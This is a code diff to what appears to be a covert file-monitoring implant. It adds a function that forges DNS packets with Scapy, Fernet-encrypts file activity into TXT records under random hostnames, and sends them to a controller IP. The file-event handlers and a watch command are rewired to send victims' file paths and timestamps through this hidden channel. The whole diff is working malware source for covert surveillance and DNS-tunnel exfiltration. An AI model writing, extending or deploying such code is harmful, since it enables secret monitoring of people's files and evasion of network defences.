@@ -82,19 +82,19 @@ BLOCK_ENCRYPTION_HANDLER.read_key("data/fernet.key")
 
 # Defining the default event handling code for files.
 def on_created(event):
-    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}", MONITOR_IDENTIFICATION)
+    query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}", MONITOR_IDENTIFICATION)
     send_dns_query(query)
 
 def on_deleted(event):
-    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}", MONITOR_IDENTIFICATION)
+    query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}", MONITOR_IDENTIFICATION)
     send_dns_query(query)
 
 def on_modified(event):
-    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}", MONITOR_IDENTIFICATION)
+    query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}", MONITOR_IDENTIFICATION)
     send_dns_query(query)
 
 def on_moved(event):
-    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}", MONITOR_IDENTIFICATION)
+    query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}", MONITOR_IDENTIFICATION)
     send_dns_query(query)
 
 
@@ -199,7 +199,7 @@ def send_dns_query(query):
     send(query, verbose=0)
 
 
-def forge_dns_query(data: str, indentification: int):
+def forge_dns_query_stream(data: str, indentification: int):
     """
         Forge dns query.
     """
@@ -217,14 +217,32 @@ def forge_dns_query(data: str, indentification: int):
     return query
 
 
+def forge_dns_query_block(data: str, indentification: int):
+    """
+        Forge dns query.
+    """
+    hostname = get_random_hostname()
+    encrypted_data = b""
+    if len(data) > 255:
+        print("ERROR: Can't fit more than 256 bytes in TXT record!")
+        print("Truncating data...")
+        truncated_data = data[0:255]
+        encrypted_data = BLOCK_ENCRYPTION_HANDLER.encrypt(truncated_data.encode("utf-8"))
+    else:
+        encrypted_data = BLOCK_ENCRYPTION_HANDLER.encrypt(data.encode("utf-8"))
+    # Forge the DNS packet with data in the text record.
+    query = IP(dst=CONTROLLER_IP, id=indentification)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
+    return query
+
+
 def execute_watch_command(path: str) -> bool:
     if not os.path.exists(path):
-        query = forge_dns_query(f"ERRORMSG: Path: {path} does not exist.", GENERAL_MSG_IDENTIFICATION)
+        query = forge_dns_query_stream(f"ERRORMSG: Path: {path} does not exist.", GENERAL_MSG_IDENTIFICATION)
         send_dns_query(query)
         return False
     # Register the path to monitor.
     MONITOR.monitor(path)
-    query = forge_dns_query(f"Path '{path}' will be monitored.", GENERAL_MSG_IDENTIFICATION)
+    query = forge_dns_query_stream(f"Path '{path}' will be monitored.", GENERAL_MSG_IDENTIFICATION)
     send_dns_query(query)
     return True
 
